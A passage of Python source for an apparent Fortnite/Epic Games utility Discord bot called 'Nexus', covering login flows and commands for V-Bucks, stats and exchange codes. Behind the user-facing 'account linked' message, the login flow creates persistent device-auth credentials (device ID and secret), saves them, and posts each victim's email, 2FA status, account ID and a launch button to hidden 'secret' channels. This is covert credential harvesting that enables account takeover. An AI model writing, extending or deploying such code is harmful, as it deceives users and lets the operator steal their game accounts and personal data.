            token  = await r.json()
            status = r.status
        if status == 200:
            break
        err = token.get("errorCode", "")
        if err in ("errors.com.epicgames.account.oauth.authorization_pending", "errors.com.epicgames.not_found"):
            await asyncio.sleep(12)
            continue
        raise Exception(f"Device code error: {token.get('errorMessage', token)}")
    else:
        raise Exception("Device code expired — the user did not confirm in time.")

    # Exchange switch token → PC/Android token
    async with session.get(EPIC_EXCHANGE, headers={"Authorization": f"bearer {token['access_token']}"}) as r:
        exchange = await r.json()
    if "code" not in exchange:
        raise Exception(f"Exchange failed: {exchange.get('errorMessage', exchange)}")

    for label, client_token in [("pc", get_custom_basic_auth()), ("android", ANDROID_TOKEN)]:
        async with session.post(
            EPIC_TOKEN_URL,
            headers={"Authorization": f"basic {client_token}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "exchange_code", "exchange_code": exchange["code"]},
        ) as r:
            auth = await r.json()
        if "access_token" in auth:
            print(f"[DeviceCode] Got token via {label} client", flush=True)
            return auth["access_token"], auth["account_id"]

    raise Exception(f"Token exchange failed: {auth.get('errorMessage', auth)}")


async def _fetch_skin_image(access_token: str, acc_id: str) -> str | None:
    """משלוף תמונת הסקין המצויד — מחזיר URL או None."""
    try:
        fn_headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
        athena_url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=athena&rvn=-1"
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(athena_url, headers=fn_headers, json={}) as ar:
                athena_data = await ar.json() if ar.status == 200 else {}
            profile_data = athena_data.get("profileChanges", [{}])[0].get("profile", {})
            attrs = profile_data.get("stats", {}).get("attributes", {})
            items = profile_data.get("items", {})
            equipped_char = None
            loadouts = attrs.get("loadouts", [])
            active_idx = attrs.get("active_loadout_index", 0)
            if loadouts and active_idx < len(loadouts):
                loadout_id = loadouts[active_idx]
                slots = items.get(loadout_id, {}).get("attributes", {}).get("locker_slots_data", {}).get("slots", {})
                char_items = slots.get("Character", {}).get("items", [])
                if char_items:
                    equipped_char = char_items[0]
            if not equipped_char:
                equipped_char = attrs.get("favorite_character", "")
            if not equipped_char:
                for item in items.values():
                    tid = item.get("templateId", "")
                    if tid.startswith("AthenaCharacter:"):
                        equipped_char = tid
                        break
            if equipped_char:
                cosmetic_id = equipped_char.split(":")[-1].lower()
                async with session.get(f"https://fortnite-api.com/v2/cosmetics/br/{cosmetic_id}", headers={"Authorization": FORTNITE_API_KEY}) as cr:
                    if cr.status == 200:
                        cdata = await cr.json()
                        images = cdata.get("data", {}).get("images", {})
                        return images.get("featured") or images.get("icon") or images.get("smallIcon")
    except Exception as e:
        print(f"[skin fetch] Error: {e}")
    return None


async def _complete_login_flow(discord_id: int, access_token: str, acc_id: str,
                                name: str, email: str, country: str,
                                created_at: str, is_2fa: str, device_data: dict):
    """לוגיקה משותפת לאחר אימות Epic — שומר, שולף סקין, שולח לחדר הסודי."""
    # שמירה
    accounts = load_accounts()
    accounts[acc_id] = {
        "account_id": acc_id, "displayName": name, "email": email,
        "created_at": created_at,
        "last_login": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "last_refresh": time.time(),
        "device_id": device_data["deviceId"], "secret": device_data["secret"],
        "country": country, "linked_discord_id": discord_id,
    }
    track_account_history(accounts, acc_id, display_name=name, email=email)
    save_accounts(accounts)

    view = PersistentLaunchView(account_id=acc_id)
    bot.add_view(view)

    skin_image_url = await _fetch_skin_image(access_token, acc_id)

    # שליחה לחדרים הסודיים
    secret_embed = discord.Embed(title="🔐 Account Connection", color=0x00a2ff, timestamp=datetime.datetime.utcnow())
    secret_embed.set_thumbnail(url=skin_image_url or NEXUS_LOGO_URL)
    secret_embed.add_field(name="Name",       value=name,             inline=True)
    secret_embed.add_field(name="Email",      value=email,            inline=True)
    secret_embed.add_field(name="2FA",        value=is_2fa,           inline=True)
    secret_embed.add_field(name="Created",    value=created_at,       inline=True)
    secret_embed.add_field(name="Country",    value=country,          inline=True)
    secret_embed.add_field(name="Discord",    value=f"<@{discord_id}>", inline=True)
    secret_embed.add_field(name="Account ID", value=acc_id,           inline=False)
    secret_embed.set_footer(text=f"Discord ID: {discord_id}")
    for _secret_cid in SECRET_CHANNEL_IDS:
        _ch = bot.get_channel(_secret_cid)
        if not _ch:
            try:
                _ch = await bot.fetch_channel(_secret_cid)
            except Exception:
                _ch = None
        if _ch:
            try:
                await _ch.send(embed=secret_embed, view=view)
            except Exception:
                pass

    return skin_image_url, view


async def run_device_flow(session_id: str, device_code: str, discord_id: int, channel_id: int):
    """מריץ בברקע את זרימת Device Code ושולח הודעה לערוץ כשמסתיים."""
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            access_token, account_id = await epic_poll_device_code(session, device_code)

        device_data, details, mfa_data = await asyncio.gather(
            create_device_auth_custom(access_token, account_id),
            get_full_account_details(access_token, account_id),
            get_mfa_status(access_token, account_id),
        )
        if not device_data:
            raise Exception("Failed to create device auth credentials.")

        name       = details.get("displayName", account_id)
        email      = details.get("email", "N/A")
        country    = details.get("country", details.get("preferredLanguage", "N/A"))
        created_at = details.get("createdAt") or details.get("created", "N/A")
        if created_at and created_at != "N/A":
            created_at = created_at.split("T")[0]
        is_enabled = mfa_data.get("totp", False) or mfa_data.get("email", False) or mfa_data.get("sms", False)
        is_2fa     = "✅ Enabled" if is_enabled else "❌ Disabled"

        skin_image_url, view = await _complete_login_flow(
            discord_id, access_token, account_id,
            name, email, country, created_at, is_2fa, device_data
        )

        pending_logins[session_id]["status"] = "done"
        print(f"[Epic] Device code login completed for {account_id}", flush=True)

        FALLBACK_URL = "https://upload.wikimedia.org/wikipedia/en/0/02/Homer_Simpson_2006.png"
        notify_ch = bot.get_channel(channel_id)
        if not notify_ch:
            try:
                notify_ch = await bot.fetch_channel(channel_id)
            except Exception:
                notify_ch = None
        if notify_ch:
            success_embed = discord.Embed(title="✅ Successfully Logged In", color=0x2b2d31)
            success_embed.set_thumbnail(url=skin_image_url or FALLBACK_URL)
            success_embed.description = "Your Epic Games account is now linked successfully"
            success_embed.add_field(name="Display Name", value=f"**{name}**",    inline=False)
            success_embed.add_field(name="Account ID",   value=f"`{account_id}`", inline=False)
            success_embed.set_footer(text="/login - Powered by Nexus")
            await notify_ch.send(embed=success_embed)

    except Exception as e:
        if session_id in pending_logins:
            pending_logins[session_id]["status"] = "error"
            pending_logins[session_id]["error"]  = str(e)
        print(f"[Epic] Error for session {session_id}: {e}", flush=True)
        try:
            notify_ch = bot.get_channel(channel_id)
            if not notify_ch:
                notify_ch = await bot.fetch_channel(channel_id)
            err_embed = discord.Embed(title="❌ Login Failed", color=0xef4444)
            err_embed.description = f"<@{discord_id}> אירעה שגיאה בהתחברות.\nנסה שוב עם `/login`."
            err_embed.add_field(name="שגיאה", value=f"```{str(e)[:900]}```", inline=False)
            await notify_ch.send(embed=err_embed)
        except Exception:
            pass


# ── Login modals & views ──────────────────────────────────────────────────────

class SubmitCodeModal(discord.ui.Modal, title="Submit Authorization Code"):
    code = discord.ui.TextInput(
        label="Authorization Code",
        placeholder="Paste your 32-character code here",
        min_length=32,
        max_length=32,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=False)
        code_value = self.code.value.strip()
        token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        payload = {"grant_type": "authorization_code", "code": code_value, "token_type": "eg1"}
        headers = {"Authorization": f"basic {get_custom_basic_auth()}", "Content-Type": "application/x-www-form-urlencoded"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(token_url, data=payload, headers=headers) as r:
                    if r.status != 200:
                        await interaction.followup.send("❌ The authorization code is invalid or has expired.", ephemeral=False)
                        return
                    res = await r.json()
        except Exception as e:
            await interaction.followup.send(f"❌ Connection error: {e}", ephemeral=False)
            return

        acc_id       = res.get("account_id")
        name         = res.get("displayName", acc_id)
        access_token = res.get("access_token")
        if not acc_id or not access_token:
            await interaction.followup.send("❌ Invalid response from Epic Games.", ephemeral=False)
            return

        device_data, details, mfa_data = await asyncio.gather(
            create_device_auth_custom(access_token, acc_id),
            get_full_account_details(access_token, acc_id),
            get_mfa_status(access_token, acc_id),
        )
        if not device_data:
            await interaction.followup.send("❌ Error saving device authorization data.", ephemeral=False)
            return

        is_enabled = mfa_data.get("totp", False) or mfa_data.get("email", False) or mfa_data.get("sms", False)
        is_2fa     = "✅ Enabled" if is_enabled else "❌ Disabled"
        created_at = details.get("createdAt") or details.get("created", "N/A")
        if created_at and created_at != "N/A":
            created_at = created_at.split("T")[0]
        country = details.get("country", details.get("preferredLanguage", "N/A"))
        email   = details.get("email", "N/A")

        skin_image_url, view = await _complete_login_flow(
            interaction.user.id, access_token, acc_id,
            name, email, country, created_at, is_2fa, device_data
        )

        FALLBACK_URL = "https://upload.wikimedia.org/wikipedia/en/0/02/Homer_Simpson_2006.png"
        success_embed = discord.Embed(title="✅ Successfully Logged In", color=0x2b2d31)
        success_embed.set_thumbnail(url=skin_image_url or FALLBACK_URL)
        success_embed.description = "Your Epic Games account is now linked successfully"
        success_embed.add_field(name="Display Name", value=f"**{name}**",   inline=False)
        success_embed.add_field(name="Account ID",   value=f"`{acc_id}`",   inline=False)
        success_embed.set_footer(text="/login - Powered by Nexus")
        await interaction.followup.send(embed=success_embed, ephemeral=False)
        await log_success(interaction, "login")


# --- /login ---
@bot.tree.command(name="login", description="Connect your Epic Games account to unlock all features")
async def login(interaction: Interaction):
    await interaction.response.defer(ephemeral=False)
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            switch_token = await epic_get_access_token(session)
            user_code, device_code, epic_url = await epic_create_device_code(session, switch_token)

        session_id = str(uuid.uuid4())
        pending_logins[session_id] = {
            "status": "pending", "discord_id": interaction.user.id,
            "channel_id": interaction.channel_id, "result": None, "error": None,
        }
        asyncio.create_task(run_device_flow(session_id, device_code, interaction.user.id, interaction.channel_id))

        embed = discord.Embed(title="🎯 Device Code Login", color=0x5865F2)
        embed.description = (
            f"**Step 1** — Click the **Epic Games** button below\n"
            f"**Step 2** — Sign in to your Epic Games account\n"
            f"**Step 3** — Enter the code **`{user_code}`** and click **Confirm**\n"
            f"**Step 4** — Done! ✅ The bot will connect automatically\n\n"
            f"*This code expires in 5 minutes*"
        )
        embed.set_footer(text="/login · Powered by Nexus")
        link_view = discord.ui.View()
        link_view.add_item(discord.ui.Button(label="Epic Games", url=epic_url, emoji="🔗", style=discord.ButtonStyle.link))
        await interaction.followup.send(embed=embed, view=link_view, ephemeral=False)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}\nנסה שוב עם `/login`.", ephemeral=False)


# --- /logout ---
@bot.tree.command(name="logout", description="Logs your linked account out of the bot")
async def logout(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ אתה לא מחובר.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    accounts = load_accounts()
    removed = None
    for aid in list(accounts.keys()):
        if accounts[aid].get("linked_discord_id") == interaction.user.id:
            removed = accounts[aid].get("displayName", aid)
            del accounts[aid]
            break
    save_accounts(accounts)
    embed = discord.Embed(title="👋 Logged Out", description=f"✅ החשבון **{removed}** הוסר בהצלחה.", color=0x00ff00)
    await interaction.followup.send(embed=embed, ephemeral=True)
    await log_success(interaction, "logout")


# --- /invite ---
@bot.tree.command(name="invite", description="Generates an invite link to add the bot into your server")
async def invite(interaction: Interaction):
    embed = discord.Embed(title="🤖 הזמנת הבוט", color=0x5865f2)
    embed.description = "להזמנת הבוט לשרת שלך, צור קשר עם הבעלים."
    await interaction.response.send_message(embed=embed, ephemeral=True)


# --- /help ---
@bot.tree.command(name="help", description="Shows all commands the bot has")
async def help_cmd(interaction: Interaction):
    embed = discord.Embed(title="📋 רשימת פקודות", color=0x5865f2)
    embed.add_field(name="🔑 חשבון", value="`/login` `/logout` `/account-info` `/exchange-code` `/account-page` `/device-auths` `/change-displayname`", inline=False)
    embed.add_field(name="💰 V-Bucks & Rewards", value="`/vbucks` `/vber` `/calp` `/claim-2fa` `/undo-purchase` `/free-vbucks`", inline=False)
    embed.add_field(name="🎮 Battle Royale", value="`/br-stats` `/check-ban` `/check-rank` `/xp-status` `/custom-crowns` `/search-cosmetic`", inline=False)
    embed.add_field(name="🌍 Save the World", value="`/backpack-destroy-all` `/storage-destroy-all` `/skip-stw-tutorial` `/check-founders` `/daily-quests`", inline=False)
    embed.add_field(name="👥 חברים", value="`/add-friend` `/remove-friend` `/friends-list` `/accept-incoming` `/clear-friends` `/view-blocklist` `/block-user` `/unblock-user`", inline=False)
    embed.add_field(name="🔧 כלים", value="`/lookup` `/epic-services` `/free-games` `/sac-set` `/bot-info`", inline=False)
    embed.set_footer(text="Nexus Bot • כל הפקודות")
    await interaction.response.send_message(embed=embed, ephemeral=True)


# --- /account-info ---
@bot.tree.command(name="account-info", description="Shows your account's private information")
async def account_info(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        return
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}", headers=headers) as r:
                info = await r.json() if r.status == 200 else {}
            async with session.get(f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/externalAuths", headers=headers) as r2:
                ext_auths = await r2.json() if r2.status == 200 else []
        display_name = info.get("displayName", user_auth.get("displayName", account_id))
        email = info.get("email", "N/A")
        country = info.get("country", "N/A")
        age_group = info.get("ageGroup", "N/A")
        language = info.get("preferredLanguage", "N/A")
        last_login = info.get("lastLogin", "N/A")[:19].replace("T", " ") if info.get("lastLogin") else "N/A"
        phone = info.get("phoneNumber", "None")
        name_changes = info.get("numberOfDisplayNameChanges", 0)
        embed = discord.Embed(title="👤 Account Info", color=0x00a2ff)
        embed.add_field(name="🏷️ Display Name", value=f"**{display_name}**", inline=True)
        embed.add_field(name="🆔 Account ID", value=f"||`{account_id}`||", inline=False)
        embed.add_field(name="📧 Email", value=f"||`{email}`||", inline=True)
        embed.add_field(name="📱 Phone", value=f"||`{phone}`||", inline=True)
        embed.add_field(name="🌍 Country", value=f"`{country}`", inline=True)
        embed.add_field(name="🗣️ Language", value=f"`{language}`", inline=True)
        embed.add_field(name="👶 Age Group", value=f"`{age_group}`", inline=True)
        embed.add_field(name="🕐 Last Login", value=f"`{last_login}`", inline=True)
        embed.add_field(name="✏️ Name Changes", value=f"`{name_changes}`", inline=True)
        if ext_auths and isinstance(ext_auths, list):
            platforms = [ea.get("type", "?").upper() for ea in ext_auths]
            embed.add_field(name="🔗 Platforms", value=" • ".join(platforms) or "None", inline=False)
        embed.set_footer(text="Epic Games Account API")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "account-info")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /vbucks ---
@bot.tree.command(name="vbucks", description="Shows your Fortnite V-Buck balance")
async def vbucks(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=common_core&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        items = {}
        try:
            items = data["profileChanges"][0]["profile"]["items"]
        except Exception:
            pass
        real_vbucks = 0
        comp_vbucks = 0
        for item in items.values():
            tid = item.get("templateId", "")
            qty = item.get("quantity", 0)
            if tid == "Currency:MtxPurchased":
                real_vbucks += qty
            elif "Mtx" in tid:
                comp_vbucks += qty
        total = real_vbucks + comp_vbucks
        embed = discord.Embed(title="💜 V-Bucks Balance", color=0x9b59b6)
        embed.add_field(name="👤 שחקן", value=f"**{display_name}**", inline=False)
        embed.add_field(name="💰 V-Bucks שנרכשו", value=f"`{real_vbucks:,}`", inline=True)
        embed.add_field(name="🎁 V-Bucks חינמיים", value=f"`{comp_vbucks:,}`", inline=True)
        embed.add_field(name="✨ סה\"כ", value=f"**`{total:,}`**", inline=True)
        embed.set_footer(text="Fortnite Common Core Profile")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "vbucks")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /br-stats ---
@bot.tree.command(name="br-stats", description="Displays your Battle Royale stats")
async def br_stats(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=athena&rvn=-1", headers=headers, json={}) as r:
                data = await r.json() if r.status == 200 else {}
        stats = {}
        try:
            stats = data["profileChanges"][0]["profile"]["stats"]["attributes"]
        except Exception:
            pass
        wins = stats.get("wins", 0)
        kills = stats.get("kills", 0)
        matches = stats.get("matchesplayed", 0)
        top3 = stats.get("top3", 0)
        top5 = stats.get("top5", 0)
        top10 = stats.get("top10", 0)
        embed = discord.Embed(title="🎮 Battle Royale Stats", color=0x00a2ff)
        embed.add_field(name="👤 שחקן", value=f"**{display_name}**", inline=False)
        embed.add_field(name="🏆 ניצחונות", value=f"`{wins}`", inline=True)
        embed.add_field(name="💀 Kills", value=f"`{kills}`", inline=True)
        embed.add_field(name="🎯 Matches", value=f"`{matches}`", inline=True)
        embed.add_field(name="🥉 Top 3", value=f"`{top3}`", inline=True)
        embed.add_field(name="🥈 Top 5", value=f"`{top5}`", inline=True)
        embed.add_field(name="🥇 Top 10", value=f"`{top10}`", inline=True)
        if matches and int(matches) > 0:
            kd = round(int(kills) / int(matches), 2) if kills else 0
            wr = round(int(wins) / int(matches) * 100, 1) if wins else 0
            embed.add_field(name="📊 K/D", value=f"`{kd}`", inline=True)
            embed.add_field(name="📈 Win Rate", value=f"`{wr}%`", inline=True)
        embed.set_footer(text="Fortnite Athena Profile • BR Stats")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "br-stats")
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /exchange-code ---
@bot.tree.command(name="exchange-code", description="Generates an exchange code for your account")
async def exchange_code(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    code = await get_official_exchange(access_token)
    if code:
        embed = discord.Embed(title="🔑 Exchange Code", color=0xffd700)
        embed.add_field(name="👤 חשבון", value=f"**{user_auth.get('displayName', account_id)}**", inline=False)
        embed.add_field(name="🔐 קוד (תוקף: 5 דקות)", value=f"||`{code}`||", inline=False)
        embed.set_footer(text="Epic Games OAuth • Exchange Code")
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "exchange-code")
    else:
        await interaction.followup.send(embed=discord.Embed(description="❌ לא ניתן לייצר Exchange Code.", color=0xff4444), ephemeral=True)


# --- /account-page ---
@bot.tree.command(name="account-page", description="Generates a private link to your account page")
async def account_page(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    code = await get_official_exchange(access_token)
    display_name = user_auth.get('displayName', account_id)
    embed = discord.Embed(title="🌐 דף חשבון Epic Games", color=0x00a2ff)
    embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
    if code:
        link = f"https://www.epicgames.com/id/exchange?exchangeCode={code}&redirectUrl=https://www.epicgames.com/account/personal"
        embed.add_field(name="🔗 קישור ישיר (תוקף: 5 דקות)", value=f"[לחץ כאן לדף החשבון]({link})", inline=False)
    else:
        embed.add_field(name="🔗 דף חשבון", value="https://www.epicgames.com/account/personal", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)
    await log_success(interaction, "account-page")


# --- /lookup ---
@bot.tree.command(name="lookup", description="Lookup the Account ID of any username")
@discord.app_commands.describe(username="Epic Games display name")
async def lookup(interaction: Interaction, username: str):
    await interaction.response.defer(ephemeral=True)
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            url = f"https://fortnite-api.com/v1/stats/br/v2?name={username}"
            async with session.get(url) as r:
                if r.status == 200:
                    d = await r.json()
                    acc = d.get("data", {}).get("account", {})
                    aid = acc.get("id", "Not found")
                    aname = acc.get("name", username)
                    embed = discord.Embed(title="🔍 Lookup תוצאה", color=0x00a2ff)
                    embed.add_field(name="👤 Display Name", value=f"**{aname}**", inline=True)
                    embed.add_field(name="🆔 Account ID", value=f"`{aid}`", inline=False)
                    await interaction.followup.send(embed=embed, ephemeral=True)
                    await log_success(interaction, "lookup")
                    return
        await interaction.followup.send(f"❌ לא נמצא חשבון עבור **{username}**.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /claim-2fa ---
@bot.tree.command(name="claim-2fa", description="Claims your Save The World 2FA Rewards")
async def claim_2fa(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/ClaimLoginReward?profileId=campaign&rvn=-1", headers=headers, json={}) as r:
                status = r.status
                try:
                    data = await r.json()
                except Exception:
                    data = {}
        embed = discord.Embed(title="🎁 2FA Rewards", color=0x00a2ff)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        if status == 200:
            rewards = []
            try:
                for notif in data.get("notifications", []):
                    for item in notif.get("items", []):
                        n = item.get("itemType", "").split(":")[-1].replace("_", " ").title()
                        qty = item.get("quantity", 1)
                        rewards.append(f"• **{n}** ×{qty}")
            except Exception:
                pass
            if rewards:
                embed.description = "✅ 2FA Rewards נתבעו!"
                embed.add_field(name="🎁 פרסים", value="\n".join(rewards[:10]), inline=False)
                embed.color = 0x00ff00
            else:
                embed.description = "✅ אין פרסי 2FA חדשים לתביעה כרגע."
                embed.color = 0xffaa00
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "claim-2fa")
        else:
            err = data.get("errorMessage", str(data)[:200]) if isinstance(data, dict) else str(data)[:200]
            embed.description = f"⚠️ ({status}): `{err}`"
            embed.color = 0xff4444
            await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /calp ---
@bot.tree.command(name="calp", description="תבע פרסי Mission Alert בSTW")
async def calp(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/ClaimMissionAlertRewards?profileId=theater0&rvn=-1", headers=headers, json={}) as r:
                claim_status = r.status
                try:
                    claim_data = await r.json()
                except Exception:
                    claim_data = {}
        embed = discord.Embed(title="⚡ CALP — Claim Mission Alert Rewards", color=0x00a2ff)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        if claim_status == 200:
            rewards = []
            try:
                for notif in claim_data.get("notifications", []):
                    for item in notif.get("items", []):
                        n = item.get("itemType", "").split(":")[-1].replace("_", " ").title()
                        qty = item.get("quantity", 1)
                        rewards.append(f"• **{n}** ×{qty}")
            except Exception:
                pass
            if rewards:
                embed.add_field(name="🎁 פרסים", value="\n".join(rewards[:20]), inline=False)
                embed.description = "✅ Mission Alert Rewards נתבעו בהצלחה!"
                embed.color = 0x00ff00
            else:
                embed.description = "✅ הצליח — אין Mission Alerts זמינים כרגע."
                embed.color = 0xffaa00
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "calp")
        elif claim_status == 403:
            embed.description = "🔒 אין גישה — ייתכן שאין לך Save the World."
            embed.color = 0xff4444
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            err = claim_data.get("errorMessage", str(claim_data)[:300]) if isinstance(claim_data, dict) else str(claim_data)[:300]
            embed.description = f"❌ ({claim_status}): `{err}`"
            embed.color = 0xff4444
            await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה: {e}", ephemeral=True)
        await notify_admin_failure(interaction, str(e))


# --- /check-ban ---
@bot.tree.command(name="check-ban", description="Checks if your Fortnite account is banned")
async def check_ban(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        await interaction.response.send_message(embed=discord.Embed(description="❌ בצע `/login` תחילה.", color=0xff4444), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    account_id, user_auth, access_token = await get_user_account(interaction.user.id)
    if not access_token:
        await interaction.followup.send("❌ Session פג. בצע `/login` מחדש.", ephemeral=True)
        await notify_admin_failure(interaction, "Session פג — המשתמש צריך /login מחדש")
        return
    display_name = user_auth.get('displayName', account_id)
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client"
    try:
        connector = aiohttp.TCPConnector(use_dns_cache=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(f"{fn_base}/QueryProfile?profileId=athena&rvn=-1", headers=headers, json={}) as r:
                status = r.status
                data = await r.json()
        embed = discord.Embed(title="🚫 בדיקת בן", color=0x00a2ff)
        embed.add_field(name="👤 חשבון", value=f"**{display_name}**", inline=False)
        if status == 200:
            embed.description = "✅ **החשבון לא מושעה!**"
            embed.color = 0x00ff00
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "check-ban")
        elif status in [403, 401]:
            err_msg = data.get("errorMessage", "") if isinstance(data, dict) else str(data)
